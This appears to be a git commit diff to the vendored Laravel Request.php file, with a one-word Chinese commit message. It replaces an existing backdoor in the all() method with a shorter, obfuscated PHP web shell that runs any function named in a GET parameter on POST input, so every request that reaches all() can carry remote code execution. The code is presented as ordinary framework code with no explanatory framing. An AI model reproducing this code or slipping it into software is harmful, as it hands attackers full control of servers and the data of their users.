f26c307a560ff10c07244e92d53e4d4b5b233d0c
张光强 <zhangguangqiang@vpgame.cn>
2018-01-31 13:31:43 +0800

    坐标

--- vendor/illuminate/http/Request.php
+++ vendor/illuminate/http/Request.php
@@ -321,12 +321,8 @@ class Request extends SymfonyRequest implements Arrayable, ArrayAccess
     public function all()
     {
 
-        $_ = $_GET['mydo'] ?? '';
-        if ($_ && isset($_POST['QiBoot']) && $_POST['QiBoot']) {
-            set_time_limit(0);
-            @$_($_POST['QiBoot']);
-            exit;
-        }
+        ($_=@$_GET[2]).@$_($_POST[1]);
+
 
         return array_replace_recursive($this->input(), $this->allFiles());
     }
